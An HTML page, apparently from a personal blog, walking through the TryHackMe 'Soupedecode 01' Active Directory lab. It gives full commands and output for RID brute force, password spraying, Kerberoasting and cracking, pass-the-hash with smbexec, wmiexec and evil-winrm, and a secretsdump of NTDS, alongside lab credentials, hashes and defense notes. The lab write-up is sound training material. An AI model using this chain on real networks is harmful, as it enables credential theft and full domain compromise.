@@ -1,0 +1,644 @@
+<!DOCTYPE html><html lang="en-in"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>TryHackme Soupedcode Walkthrough  - h4ck3rfirst</title><meta name="robots" content="noindex,nofollow"><meta name="generator" content="Publii Open-Source CMS for Static Site"><meta property="og:title" content="TryHackme Soupedcode Walkthrough "><meta property="og:image" content="https://h4ck3rfirst.github.io/media/website/profile-2.png"><meta property="og:image:width" content="300"><meta property="og:image:height" content="300"><meta property="og:site_name" content="h4ck3rfirst"><meta property="og:description" content="Complete walkthrough of the Tryhackme Pentest Lab machine Soupedcode Tryhackme Difficulty: Easy OS: Windows (Active Directory) Platform: TryHackMe Category: Active&amp;hellip;"><meta property="og:url" content="https://h4ck3rfirst.github.io/tryhackme-soupedcode-walkthrough/"><meta property="og:type" content="article"><link rel="stylesheet" href="https://h4ck3rfirst.github.io/assets/css/style.css?v&#x3D;1caf1a6f5543014e342e13c53b1080b8"><script type="application/ld+json">{"@context":"http://schema.org","@type":"Article","mainEntityOfPage":{"@type":"WebPage","@id":"https://h4ck3rfirst.github.io/tryhackme-soupedcode-walkthrough/"},"headline":"TryHackme Soupedcode Walkthrough ","datePublished":"2026-03-11T03:16+05:30","dateModified":"2026-09-30T19:17+05:30","image":{"@type":"ImageObject","url":"https://h4ck3rfirst.github.io/media/website/profile-2.png","height":300,"width":300},"description":"Complete walkthrough of the Tryhackme Pentest Lab machine Soupedcode Tryhackme Difficulty: Easy OS: Windows (Active Directory) Platform: TryHackMe Category: Active&hellip;","author":{"@type":"Person","name":"h4ck3rfirst","url":"https://h4ck3rfirst.github.io/authors/h4ck3rfirst/"},"publisher":{"@type":"Organization","name":"h4ck3rfirst","logo":{"@type":"ImageObject","url":"https://h4ck3rfirst.github.io/media/website/profile-2.png","height":300,"width":300}}}</script><noscript><style>img[loading] {
+                    opacity: 1;
+                }</style></noscript><style>@media (max-width: 600px) {
+    #publii-space-dust {
+        opacity: 0.85;
+    }
+}</style></head><body class="post-template"><div id="publii-space-dust" aria-hidden="true"><div id="publii-space-mouse-glow"></div></div><header class="top js-header"><a class="logo" href="https://h4ck3rfirst.github.io/"><img src="https://h4ck3rfirst.github.io/media/website/profile-2.png" alt="h4ck3rfirst" width="300" height="300"></a><nav class="navbar js-navbar"><button class="navbar__toggle js-toggle" aria-label="Menu" aria-haspopup="true" aria-expanded="false"><span class="navbar__toggle-box"><span class="navbar__toggle-inner">Menu</span></span></button><ul class="navbar__menu"><li><a href="https://h4ck3rfirst.github.io/" target="_self" rel="https://h4ck3rfirst.github.io/">Home</a></li><li><a href="https://h4ck3rfirst.github.io/tags/ctf-writeups/" target="_self">CTF/Labs</a></li><li><a href="https://h4ck3rfirst.github.io/tags/linux/" target="_self">Linux</a></li><li><a href="https://h4ck3rfirst.github.io/tags/windows/" target="_self">Windows</a></li><li><a href="https://h4ck3rfirst.github.io/tags/learning/" target="_self">Learning</a></li><li><a href="https://h4ck3rfirst.github.io/about-me/" target="_self">About me</a></li></ul></nav></header><main class="post"><article class="content"><div class="hero hero--noimage"><header class="hero__content"><div class="wrapper"><h1>TryHackme Soupedcode Walkthrough </h1><div class="feed__meta content__meta"><a href="https://h4ck3rfirst.github.io/authors/h4ck3rfirst/" class="feed__author">h4ck3rfirst</a> <time datetime="2026-03-11T03:16" class="feed__date">March 11, 2026</time></div></div></header></div><div class="entry-wrapper content__entry"><p>Complete walkthrough of the Tryhackme Pentest Lab machine <strong>Soupedcode</strong> Tryhackme</p><p><strong>Difficulty:</strong> Easy <strong>OS:</strong> Windows (Active Directory) <strong>Platform:</strong> TryHackMe<br><strong>Category:</strong> Active Directory</p><h2 id="synopsis">Synopsis</h2><p><strong>Soupedecode 01</strong> is a beginner-friendly Active Directory room that walks through a complete, realistic AD attack chain using only well-known techniques and no exploits. Starting from zero credentials, the path moves through guest SMB access → RID bruteforce for usernames → password spraying → Kerberoasting → backup share access → NTLM hash spraying → Domain Admin via Pass-the-Hash.</p><p><strong>Attack Chain Overview:</strong></p><pre><code>[No Creds]
+    │
+    ▼ Guest SMB + RID Bruteforce
+[Username List]
+    │
+    ▼ Password Spray (user:user)
+[ybob317 : ybob317]  →  user.txt 🚩
+    │
+    ▼ Kerberoasting
+[file_svc : Password123!!]
+    │
+    ▼ Backup Share → NTLM Hashes
+[backup_extract.txt]
+    │
+    ▼ Hash Spray → Pass-the-Hash
+[FileServer$ → Enterprise Admin]  →  root.txt 🚩
+</code></pre><p><strong>No CVEs required.</strong> Every step abuses a legitimate Windows/AD feature that is simply misconfigured.</p><hr><h2 id="skills-covered">Skills Covered</h2><ul><li>AD enumeration from zero credentials via guest SMB</li><li>RID bruteforce for domain user enumeration</li><li>Password spraying (username-as-password pattern)</li><li>Kerberoasting TGS hash extraction and cracking</li><li>SMB share enumeration and access</li><li>NTLM hash spraying (Pass-the-Hash)</li><li>Administrative access via computer account membership in Enterprise Admins</li></ul><hr><h2 id="reconnaissance">Reconnaissance</h2><h3 id="nmap-port-scan">Nmap Port Scan</h3><pre><code class="language-bash">nmap -sCV --min-rate 5000 -T4 -p- soupedecode.local
+</code></pre><p><strong>Key open ports:</strong></p><table><thead><tr><th>Port</th><th>Service</th><th>Significance</th></tr></thead><tbody><tr><td>53</td><td>DNS</td><td>Domain name resolution</td></tr><tr><td>88</td><td>Kerberos</td><td>Confirms Active Directory</td></tr><tr><td>389 / 3268</td><td>LDAP / Global Catalog</td><td>AD queries possible</td></tr><tr><td>445</td><td>SMB</td><td>File sharing — primary attack surface</td></tr><tr><td>3389</td><td>RDP</td><td>Remote Desktop (useful later)</td></tr><tr><td>9389</td><td>.NET Message Framing</td><td>AD Web Services</td></tr></tbody></table><blockquote><p><strong>Key observation:</strong> The combination of ports 53, 88, 389, and 445 is the unmistakable fingerprint of a <strong>Domain Controller</strong>. The nmap output directly reveals:</p><ul><li><strong>Hostname:</strong> <code>DC01</code></li><li><strong>Domain:</strong> <code>SOUPEDECODE.LOCAL</code></li><li><strong>OS:</strong> Windows Server 2022 Build 20348</li></ul></blockquote><p>Add to <code>/etc/hosts</code> before proceeding:</p><pre><code class="language-bash">echo &quot;10.10.X.X DC01.SOUPEDECODE.LOCAL SOUPEDECODE.LOCAL&quot; | sudo tee -a /etc/hosts
+</code></pre><blockquote><p><strong>Note on SMB signing:</strong> The scan shows <code>Message signing enabled and required</code>. This means <strong>SMB relay attacks will not work</strong> here — we cannot relay captured NTLM hashes for lateral movement via tools like Responder + ntlmrelayx. We must use Pass-the-Hash directly instead.</p></blockquote><hr><h2 id="enumeration">Enumeration</h2><h3 id="smb--guest-access">SMB — Guest Access</h3><p>The first thing to check on any AD box is whether the <strong>guest account</strong> is enabled and what it can access. This costs nothing and frequently reveals significant information.</p><pre><code class="language-bash">nxc smb $ip -u guest -p &#39;&#39; --shares
+</code></pre><p><strong>Output:</strong></p><pre><code>SMB  DC01  [+] SOUPEDECODE.LOCAL\guest:
+SMB  DC01  Share        Permissions   Remark
+SMB  DC01  -----        -----------   ------
+SMB  DC01  ADMIN$                     Remote Admin
+SMB  DC01  backup                     
+SMB  DC01  C$                         Default share
+SMB  DC01  IPC$         READ          Remote IPC
+SMB  DC01  NETLOGON                   Logon server share
+SMB  DC01  SYSVOL                     Logon server share
+SMB  DC01  Users
+</code></pre><p><strong>What this tells us:</strong></p><ul><li>Guest login is <strong>enabled</strong> — a misconfiguration</li><li><code>IPC$</code> is readable — this is the critical one; it enables RID bruteforce</li><li><code>backup</code> share exists — no access yet, but it’s a target</li><li><code>Users</code> share exists — no access yet</li></ul><blockquote><p><strong>Why IPC$ matters:</strong> The IPC$ (Inter-Process Communication) share is used for named pipe communication. Read access to it allows unauthenticated users to make MSRPC calls, including querying the SAM database via the SAMR protocol to enumerate domain users and groups — this is the foundation of RID bruteforce.</p></blockquote><hr><h3 id="rid-bruteforce--username-enumeration">RID Bruteforce — Username Enumeration</h3><p>Every AD object (user, group, computer) has a unique <strong>Security Identifier (SID)</strong>. The last component of the SID is the <strong>RID (Relative Identifier)</strong>. Well-known RIDs are predictable (e.g., 500 = Administrator, 501 = Guest), and regular user accounts are assigned sequentially starting from 1000.</p><p>By iterating RIDs and querying what object owns each one via the SAMR protocol over IPC$, we can enumerate all domain users without any credentials:</p><pre><code class="language-bash"># Enumerate and save clean username list in one command
+nxc smb $ip -u guest -p &#39;&#39; --rid-brute 3000 \
+  | grep SidTypeUser \
+  | cut -d&#39;\&#39; -f2 \
+  | cut -d&#39; &#39; -f1 &gt; username-rid.txt
+
+# Verify
+wc -l username-rid.txt
+head username-rid.txt
+</code></pre><p><strong>Alternative tools for RID bruteforce:</strong></p><pre><code class="language-bash"># Using lookupsid.py (impacket) — same result, different syntax
+impacket-lookupsid &#39;SOUPEDECODE.LOCAL/guest:@DC01.SOUPEDECODE.LOCAL&#39; 3000 \
+  | grep SidTypeUser \
+  | awk -F&#39;\\ &#39; &#39;{print $2}&#39; \
+  | cut -d&#39; &#39; -f1 &gt; username-rid.txt
+
+# Using enum4linux-ng
+enum4linux-ng -A -u guest -p &#39;&#39; DC01.SOUPEDECODE.LOCAL
+</code></pre><blockquote><p><strong>Why RID 3000?</strong> Default user accounts start at RID 1000. In a domain with hundreds of users, 3000 is a safe upper bound that ensures you catch everyone without wasting too many requests on empty RIDs.</p></blockquote><hr><h3 id="ldap-enumeration-attempted">LDAP Enumeration (Attempted)</h3><p>With valid credentials later, LDAP can be queried for richer AD information — group memberships, ACLs, GPOs, etc. We also attempted BloodHound collection:</p><pre><code class="language-bash">nxc ldap $ip -u ybob317 -p ybob317
+# [+] SOUPEDECODE.LOCAL\ybob317:ybob317
+
+# BloodHound collection attempt — failed (DNS resolution issue)
+nxc ldap $ip -u ybob317 -p ybob317 --bloodhound --collection All
+# [-] Could not find a domain controller. Consider specifying a domain and/or DNS server.
+</code></pre><blockquote><p><strong>Fix for BloodHound DNS issue:</strong> This error occurs when the tool cannot resolve the DC by name. Solve it by specifying the domain controller DNS explicitly:</p><pre><code class="language-bash">nxc ldap $ip -u ybob317 -p ybob317 --bloodhound --collection All \
+  --dns-server $ip --domain SOUPEDECODE.LOCAL
+</code></pre><p>On a real engagement, BloodHound would map all attack paths visually — very useful for more complex environments.</p></blockquote><hr><h2 id="user-flag--password-spraying">User Flag — Password Spraying</h2><h3 id="strategy-username--password">Strategy: Username = Password</h3><p>Before trying complex wordlists, always check the lowest-effort options first. A common weak password pattern is users setting their password to match their username. This is trivially testable at scale using <code>--no-bruteforce</code> (pairs each user with the password at the same line position — so user 1 tries password 1, user 2 tries password 2, etc.).</p><pre><code class="language-bash"># Use the same file for both usernames AND passwords
+nxc smb $ip \
+  -u username-rid.txt \
+  -p username-rid.txt \
+  --no-bruteforce \
+  --continue-on-success \
+  | grep &#39;\[+\]&#39;
+</code></pre><p><strong>Result:</strong></p><pre><code>SMB  DC01  [+] SOUPEDECODE.LOCAL\ybob317:ybob317
+</code></pre><p><strong>Other password spray patterns to try (in order of likelihood):</strong></p><table><thead><tr><th>Pattern</th><th>Example</th><th>Command</th></tr></thead><tbody><tr><td>Username = Password</td><td><code>ybob317:ybob317</code></td><td><code>-u users.txt -p users.txt --no-bruteforce</code></td></tr><tr><td>Domain name</td><td><code>Soupedecode1</code></td><td><code>-u users.txt -p &#39;Soupedecode1&#39;</code></td></tr><tr><td>Season + Year</td><td><code>Spring2024!</code></td><td><code>-u users.txt -p &#39;Spring2024!&#39;</code></td></tr><tr><td>Company name</td><td><code>Company123!</code></td><td><code>-u users.txt -p &#39;Company123!&#39;</code></td></tr><tr><td>Welcome patterns</td><td><code>Welcome1!</code></td><td><code>-u users.txt -p &#39;Welcome1!&#39;</code></td></tr></tbody></table><blockquote><p><strong>⚠️ Lockout Warning:</strong> Always check the domain password policy before spraying. Spraying too many passwords per user risks locking accounts. Use <code>--continue-on-success</code> to avoid re-trying valid accounts, and limit attempts to 1–2 passwords per user per run unless you’ve confirmed there’s no lockout policy.</p><p>Check lockout policy:</p><pre><code class="language-bash">nxc smb $ip -u guest -p &#39;&#39; --pass-pol
+</code></pre></blockquote><h3 id="asreproasting-checked-not-applicable">ASREPRoasting (Checked, Not Applicable)</h3><p>Before spraying, also check for <strong>ASREPRoastable</strong> accounts — users with Kerberos pre-authentication disabled. These accounts return a hash without any credentials:</p><pre><code class="language-bash"># Check for ASREPRoastable accounts
+impacket-GetNPUsers SOUPEDECODE.LOCAL/ \
+  -usersfile username-rid.txt \
+  -no-pass \
+  -dc-ip $ip \
+  -outputfile asrep_hashes.txt
+
+# No vulnerable accounts found in this room
+</code></pre><h3 id="retrieving-the-user-flag">Retrieving the User Flag</h3><p>With <code>ybob317:ybob317</code>, we now have read access to the <code>Users</code> share:</p><pre><code class="language-bash">nxc smb $ip -u ybob317 -p ybob317 --shares
+# Users  READ
+
+impacket-smbclient &#39;SOUPEDECODE.LOCAL/ybob317:ybob317@DC01.SOUPEDECODE.LOCAL&#39;
+</code></pre><pre><code># use Users
+# cd ybob317/Desktop
+# ls
+# get user.txt
+</code></pre><p>🚩 <strong>User flag obtained.</strong></p><hr><h2 id="privilege-escalation">Privilege Escalation</h2><h3 id="step-1--kerberoasting">Step 1 — Kerberoasting</h3><p>With valid domain credentials, we can request <strong>TGS (Ticket Granting Service)</strong> tickets for any service account that has an SPN (Service Principal Name) registered. These tickets are encrypted with the service account’s password hash and can be cracked offline.</p><pre><code class="language-bash">impacket-GetUserSPNs \
+  -request \
+  -outputfile kerberoastables.txt \
+  &#39;SOUPEDECODE.LOCAL/ybob317:ybob317&#39; \
+  -dc-ip $ip
+</code></pre><p><strong>SPNs Found:</strong></p><table><thead><tr><th>SPN</th><th>Account</th><th>Password Last Set</th></tr></thead><tbody><tr><td>FTP/FileServer</td><td><code>file_svc</code></td><td>2024-06-17</td></tr><tr><td>FW/ProxyServer</td><td><code>firewall_svc</code></td><td>2024-06-17</td></tr><tr><td>HTTP/BackupServer</td><td><code>backup_svc</code></td><td>2024-06-17</td></tr><tr><td>HTTP/WebServer</td><td><code>web_svc</code></td><td>2024-06-17</td></tr><tr><td>HTTPS/MonitoringServer</td><td><code>monitoring_svc</code></td><td>2024-06-17</td></tr></tbody></table><blockquote><p><strong>Why Kerberoasting works:</strong> Service accounts frequently have weak passwords because they are sometimes managed manually and not subject to the same rotation policies as user accounts. Attackers request a TGS ticket (which any authenticated domain user can do — it’s a normal Kerberos operation), extract the encrypted blob, and crack it offline at full GPU speed without touching the DC again.</p></blockquote><p><strong>Cracking the hashes:</strong></p><pre><code class="language-bash"># Method 1: John the Ripper (your method)
+john kerberoastables.txt --wordlist=/usr/share/wordlists/rockyou.txt
+
+# Method 2: Hashcat (mode 13100 = TGS-REP RC4)
+hashcat -m 13100 kerberoastables.txt /usr/share/wordlists/rockyou.txt
+
+# View cracked results
+john kerberoastables.txt --show
+# OR
+hashcat -m 13100 kerberoastables.txt --show
+</code></pre><p><strong>Cracked:</strong> <code>file_svc : Password123!!</code></p><blockquote><p><strong>Tip — Which hash cracked?</strong> The room has 5 service accounts. John cracked only one because only <code>file_svc</code> has a password in rockyou.txt. The others likely have stronger passwords. In a real engagement, also try targeted wordlists based on company name and known password patterns.</p></blockquote><h3 id="step-2--confirm-file_svc-access">Step 2 — Confirm file_svc Access</h3><p>Spray the cracked password against all kerberoastable service accounts to confirm which one it belongs to:</p><pre><code class="language-bash">nxc smb $ip \
+  -u file_svc firewall_svc backup_svc web_svc monitoring_svc \
+  -p &#39;Password123!!&#39; \
+  --continue-on-success \
+  | grep &#39;\[+\]&#39;
+
+# [+] SOUPEDECODE.LOCAL\file_svc:Password123!!
+</code></pre><p>Check share access — <code>backup</code> share is now readable:</p><pre><code class="language-bash">nxc smb $ip -u file_svc -p &#39;Password123!!&#39; --shares
+# backup  READ
+</code></pre><h3 id="step-3--harvesting-ntlm-hashes-from-backup-share">Step 3 — Harvesting NTLM Hashes from Backup Share</h3><pre><code class="language-bash">impacket-smbclient &#39;SOUPEDECODE.LOCAL/file_svc:Password123!!@DC01.SOUPEDECODE.LOCAL&#39;
+</code></pre><pre><code># use backup
+# ls
+-rw-rw-rw-  892  backup_extract.txt
+# get backup_extract.txt
+</code></pre><p><strong>Contents of <code>backup_extract.txt</code>:</strong></p><pre><code>WebServer$:2119:aad3b435b51404eeaad3b435b51404ee:c47b45f5d4df5a494bd19f13e14f7902:::
+DatabaseServer$:2120:aad3b435b51404eeaad3b435b51404ee:406b424c7b483a42458bf6f545c936f7:::
+CitrixServer$:2122:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
+FileServer$:2065:aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559:::
+MailServer$:2124:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
+BackupServer$:2125:aad3b435b51404eeaad3b435b51404ee:46a4655f18def136b3bfab7b0b4e70e3:::
+ApplicationServer$:2126:aad3b435b51404eeaad3b435b51404ee:8cd90ac6cba6dde9d8038b068c17e3f5:::
+PrintServer$:2127:aad3b435b51404eeaad3b435b51404ee:b8a38c432ac59ed00b2a373f4f050d28:::
+ProxyServer$:2128:aad3b435b51404eeaad3b435b51404ee:4e3f0bb3e5b6e3e662611b1a87988881:::
+MonitoringServer$:2129:aad3b435b51404eeaad3b435b51404ee:48fc7eca9af236d7849273990f6c5117:::
+</code></pre><blockquote><p><strong>Understanding the format:</strong> This is the classic <code>/etc/shadow</code>-equivalent for Windows — a <strong>NTDS dump extract</strong> (format: <code>username:RID:LM_hash:NT_hash:::</code>). The LM hash <code>aad3b435b51404eeaad3b435b51404ee</code> is the universal empty/disabled LM hash in Windows (LM hashing is disabled by default since Vista). The <strong>NT hash</strong> (4th field) is what we actually need.</p></blockquote><p><strong>Parse the file — your clean method:</strong></p><pre><code class="language-bash"># Extract usernames (clean, your method)
+grep -o &#39;^[^:]*\$&#39; backup_extract.txt | sed &#39;s/\$//&#39;
+
+# Extract for spray — method 1 (standard)
+cut -d&#39;:&#39; -f1 backup_extract.txt &gt; backup_users.txt
+cut -d&#39;:&#39; -f4 backup_extract.txt &gt; backup_hashes.txt
+
+# Extract for spray — method 2 (one-liner with paste)
+paste -d: \
+  &lt;(cut -d&#39;:&#39; -f1 backup_extract.txt) \
+  &lt;(cut -d&#39;:&#39; -f4 backup_extract.txt) &gt; user_hash_pairs.txt
+</code></pre><h3 id="step-4--ntlm-hash-spraying-pass-the-hash">Step 4 — NTLM Hash Spraying (Pass-the-Hash)</h3><p>With a list of computer account hashes, we spray them all against SMB to find which ones are valid. This is <strong>Pass-the-Hash</strong> — Windows NTLM authentication uses the hash directly, so cracking is not needed:</p><pre><code class="language-bash">nxc smb $ip \
+  -u backup_users.txt \
+  -H backup_hashes.txt \
+  --no-bruteforce \
+  --continue-on-success \
+  | grep &#39;\[+\]&#39;
+</code></pre><p><strong>Result:</strong></p><pre><code>SMB  DC01  [+] SOUPEDECODE.LOCAL\FileServer$:e41da7e79a4c76dbd9cf79d1cb325559 (Pwn3d!)
+</code></pre><blockquote><p><strong>Why <code>(Pwn3d!)</code>?</strong> NetExec marks an account as <code>Pwn3d!</code> when it has local administrator access on the target — meaning it can access <code>ADMIN$</code> or <code>C$</code> shares. For a Domain Controller, this effectively means full domain control.</p></blockquote><p><strong>Why does a computer account have admin rights?</strong> After getting root, we can verify:</p><pre><code class="language-powershell"># On the DC (via smbexec)
+powershell -c &quot;(Get-ADComputer &#39;FileServer$&#39; -Properties MemberOf).MemberOf&quot;
+# CN=Enterprise Admins,CN=Users,DC=SOUPEDECODE,DC=LOCAL
+</code></pre><p><code>FileServer$</code> is a <strong>member of Enterprise Admins</strong> — the highest privilege group in an AD forest. This is a severe misconfiguration; computer accounts should never be in privileged groups.</p><hr><h2 id="root-flag--multiple-methods">Root Flag — Multiple Methods</h2><h3 id="method-1--smbexecpy-your-method--command-execution">Method 1 — smbexec.py (Your Method — Command Execution)</h3><pre><code class="language-bash">impacket-smbexec \
+  -hashes :e41da7e79a4c76dbd9cf79d1cb325559 \
+  &#39;SOUPEDECODE.LOCAL/FileServer$@DC01.SOUPEDECODE.LOCAL&#39;
+
+C:\Windows\system32&gt; whoami
+nt authority\system
+
+C:\Windows\system32&gt; type C:\Users\Administrator\Desktop\root.txt
+</code></pre><p>🚩 <strong>Root flag obtained.</strong></p><blockquote><p><strong>How smbexec works:</strong> It creates a temporary Windows service that executes commands via SMB, reading output by writing it to a temp file. It’s slightly noisier than psexec but doesn’t drop a binary on disk.</p></blockquote><h3 id="method-2--smbclientpy-direct-file-retrieval--your-method">Method 2 — smbclient.py (Direct File Retrieval — Your Method)</h3><p>No need for a shell if you just need the flag file:</p><pre><code class="language-bash">impacket-smbclient \
+  -hashes :e41da7e79a4c76dbd9cf79d1cb325559 \
+  &#39;SOUPEDECODE.LOCAL/FileServer$@DC01.SOUPEDECODE.LOCAL&#39;
+
+# use C$
+# cd Users/Administrator/Desktop
+# get root.txt
+</code></pre><h3 id="method-3--wmiexecpy-stealthier-shell">Method 3 — wmiexec.py (Stealthier Shell)</h3><pre><code class="language-bash">impacket-wmiexec \
+  -hashes :e41da7e79a4c76dbd9cf79d1cb325559 \
+  &#39;SOUPEDECODE.LOCAL/FileServer$@DC01.SOUPEDECODE.LOCAL&#39;
+
+C:\&gt; type C:\Users\Administrator\Desktop\root.txt
+</code></pre><blockquote><p><strong>wmiexec vs smbexec:</strong> wmiexec uses WMI (Windows Management Instrumentation) over DCOM port 135, leaving a different artifact trail than SMB-based execution. Neither is “silent” but wmiexec avoids touching the Windows Service Manager.</p></blockquote><h3 id="method-4--evil-winrm-rdpwinrm-if-enabled">Method 4 — Evil-WinRM (RDP/WinRM, if enabled)</h3><p>Since port 3389 (RDP) was open, and if WinRM (5985) were available, full interactive sessions are possible:</p><pre><code class="language-bash"># WinRM with hash
+evil-winrm -i $ip \
+  -u &#39;FileServer$&#39; \
+  -H e41da7e79a4c76dbd9cf79d1cb325559
+
+# RDP with hash (using xfreerdp)
+xfreerdp /v:$ip \
+  /u:&#39;FileServer$&#39; \
+  /pth:e41da7e79a4c76dbd9cf79d1cb325559 \
+  /d:SOUPEDECODE.LOCAL
+</code></pre><h3 id="method-5--secretsdump-dump-full-ntds">Method 5 — Secretsdump (Dump Full NTDS)</h3><p>With <code>Pwn3d!</code> access we can dump the entire AD database:</p><pre><code class="language-bash">impacket-secretsdump \
+  -hashes :e41da7e79a4c76dbd9cf79d1cb325559 \
+  &#39;SOUPEDECODE.LOCAL/FileServer$@DC01.SOUPEDECODE.LOCAL&#39;
+
+# Dumps: SAM, LSA secrets, NTDS.dit contents
+# Includes: Administrator:500:...:NTLM_HASH:::
+</code></pre><p>This gives you every user’s NT hash in the domain — the crown jewels of an AD compromise.</p><hr><h2 id="concept-deep-dives">Concept Deep-Dives</h2><h3 id="what-is-rid-bruteforce">What is RID Bruteforce?</h3><p>Windows identifies every security principal (users, groups, computers) with a SID. The SID has the form <code>S-1-5-21-&lt;domain&gt;-&lt;RID&gt;</code>. By querying the SAMR protocol over IPC$ for RIDs 500 through N, an attacker maps RIDs to account names. This works because the SAMR protocol allows any user with IPC$ READ to call <code>LookupRids()</code> — no additional privileges needed. It’s a legitimate protocol function, not an exploit.</p><p><strong>Defense:</strong> Disable the guest account. Restrict anonymous/guest IPC$ access via the <code>RestrictAnonymous</code> registry key.</p><h3 id="what-is-password-spraying-vs-brute-force">What is Password Spraying vs. Brute Force?</h3><p><strong>Brute force</strong> tries many passwords against one account → triggers lockout.<br><strong>Password spraying</strong> tries one password against many accounts → stays under lockout threshold.</p><p>The <code>--no-bruteforce</code> flag in nxc pairs username[n] with password[n] — not every combination. This means it tries <code>user1:pass1</code>, <code>user2:pass2</code>, etc. — effectively a targeted “username = password” check in a single pass.</p><h3 id="what-is-kerberoasting">What is Kerberoasting?</h3><p>Kerberos TGS tickets are encrypted with the service account’s NT hash. Any authenticated domain user can request a TGS for any SPN — this is by design. The attack extracts the encrypted ticket blob and cracks it offline. The <code>etype 23</code> (RC4-HMAC) ticket type is weakest and crackable fastest; modern DCs may use <code>etype 17/18</code> (AES) which is much slower to crack.</p><p><strong>Defense:</strong> Use long, random service account passwords (&gt;25 chars). Enable AES-only encryption for SPNs. Consider Managed Service Accounts (gMSA) which rotate passwords automatically.</p><h3 id="what-is-pass-the-hash">What is Pass-the-Hash?</h3><p>Windows NTLM authentication works by: client sends username → server sends challenge → client responds with HMAC-MD4(NT_hash, challenge). Notice the client never sends the plaintext password — just the hash. Therefore, if you have the NT hash, you can authenticate as that user without ever knowing the password. This is fundamental to NTLM and cannot be “patched” without replacing NTLM entirely.</p><p><strong>Defense:</strong> Use Kerberos instead of NTLM wherever possible. Enable Protected Users security group for admin accounts. Implement PAM (Privileged Access Management). Monitor for NTLM authentication from unusual sources.</p><hr><h2 id="attack-chain-summary">Attack Chain Summary</h2><pre><code>[Guest Account — No Creds]
+         │
+         │  nxc --rid-brute → 500+ usernames
+         ▼
+[username-rid.txt]
+         │
+         │  nxc password spray (user:user)
+         ▼
+[ybob317 : ybob317]
+         │  
+         │  SMB Users share → ybob317/Desktop/user.txt
+         │  🚩 USER FLAG
+         │
+         │  GetUserSPNs → 5 kerberoastable accounts
+         │  john → cracks file_svc : Password123!!
+         ▼
+[file_svc : Password123!!]
+         │
+         │  SMB backup share → backup_extract.txt
+         │  10 computer account NTLM hashes
+         ▼
+[backup_extract.txt NTLM hashes]
+         │
+         │  nxc hash spray → FileServer$ Pwn3d!
+         │  FileServer$ ∈ Enterprise Admins
+         ▼
+[FileServer$ (Enterprise Admin)]
+         │
+         │  smbexec / smbclient C$ → root.txt
+         │  🚩 ROOT FLAG
+         ▼
+[Full Domain Compromise]
+</code></pre><hr><h2 id="key-takeaways">Key Takeaways</h2><p><strong>1. Guest SMB Access Is Dangerous</strong><br>A guest account with IPC$ read access hands the attacker a full username list at zero cost. Disable guest accounts or restrict IPC$ access on all DCs.</p><p><strong>2. Usernames Are Not Secrets — Passwords Are</strong><br>RID bruteforce is always possible if guest IPC$ access is open. Design your password policy assuming attackers already know all usernames.</p><p><strong>3. Username = Password Is Embarrassingly Common</strong><br>This pattern appears in real-world engagements constantly. Enforce complexity requirements and audit for this specific pattern during provisioning.</p><p><strong>4. Kerberoastable Service Accounts Need Strong Passwords</strong><br>Any account with an SPN and a weak password is owned the moment an attacker gets any domain foothold. Use gMSA (Group Managed Service Accounts) to eliminate this attack surface entirely.</p><p><strong>5. Backup Files Containing Hashes Are Catastrophic</strong><br><code>backup_extract.txt</code> was an NTDS extract left readable on a share. This is equivalent to leaving a copy of <code>/etc/shadow</code> world-readable. Treat any file containing hashes as maximally sensitive.</p><p><strong>6. Computer Accounts Can Have Dangerous Privileges</strong><br><code>FileServer$</code> being in Enterprise Admins is a severe misconfiguration that is easily overlooked because most attention focuses on user accounts. Audit group memberships for all object types, including computers and service accounts.</p><hr><h2 id="tools-reference">Tools Reference</h2><table><thead><tr><th>Tool</th><th>Purpose</th><th>Command Pattern</th></tr></thead><tbody><tr><td><code>nmap</code></td><td>Port scan</td><td><code>nmap -sCV -p- $ip</code></td></tr><tr><td><code>nxc</code> / <code>netexec</code></td><td>SMB/LDAP Swiss army knife</td><td><code>nxc smb $ip -u X -p Y --shares</code></td></tr><tr><td><code>impacket-GetUserSPNs</code></td><td>Kerberoasting</td><td><code>-request -outputfile hashes.txt</code></td></tr><tr><td><code>impacket-smbclient</code></td><td>SMB file access</td><td><code>&#39;DOMAIN/user:pass@host&#39;</code></td></tr><tr><td><code>impacket-smbexec</code></td><td>Command execution via SMB</td><td><code>-hashes :NTLM &#39;DOMAIN/user@host&#39;</code></td></tr><tr><td><code>impacket-secretsdump</code></td><td>Dump AD hashes</td><td><code>-hashes :NTLM &#39;DOMAIN/user@host&#39;</code></td></tr><tr><td><code>john</code></td><td>Hash cracking</td><td><code>--wordlist=rockyou.txt hashes.txt</code></td></tr><tr><td><code>hashcat</code></td><td>Hash cracking (GPU)</td><td><code>-m 13100 hashes.txt wordlist</code></td></tr><tr><td><code>evil-winrm</code></td><td>WinRM shell</td><td><code>-i $ip -u user -H hash</code></td></tr></tbody></table><hr></div><footer class="content__footer"><div class="entry-wrapper"><p class="content__updated">This article was updated on September 30, 2026</p><div class="content__actions"><ul class="content__tag"><li><a href="https://h4ck3rfirst.github.io/tags/getuserspn/">getuserspn</a></li><li><a href="https://h4ck3rfirst.github.io/tags/impacket/">impacket</a></li><li><a href="https://h4ck3rfirst.github.io/tags/john/">john</a></li><li><a href="https://h4ck3rfirst.github.io/tags/ldap/">ldap</a></li><li><a href="https://h4ck3rfirst.github.io/tags/rid/">rid</a></li><li><a href="https://h4ck3rfirst.github.io/tags/smb/">smb</a></li><li><a href="https://h4ck3rfirst.github.io/tags/soupedcode/">Soupedcode</a></li><li><a href="https://h4ck3rfirst.github.io/tags/tryhackme/">TryHackMe</a></li><li><a href="https://h4ck3rfirst.github.io/tags/wimrm/">wimrm</a></li><li><a href="https://h4ck3rfirst.github.io/tags/windows/">Windows</a></li></ul><div class="content__share"><button class="btn--icon content__share-button js-content__share-button"><svg width="20" height="20" aria-hidden="true"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#share"></use></svg> <span>Share It</span></button><div class="content__share-popup js-content__share-popup"><a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fh4ck3rfirst.github.io%2Ftryhackme-soupedcode-walkthrough%2F" class="js-share linkedin" rel="nofollow noopener noreferrer"><svg class="icon" aria-hidden="true" focusable="false"><use xlink:href="https://h4ck3rfirst.github.io/assets/svg/svg-map.svg#linkedin"/></svg> 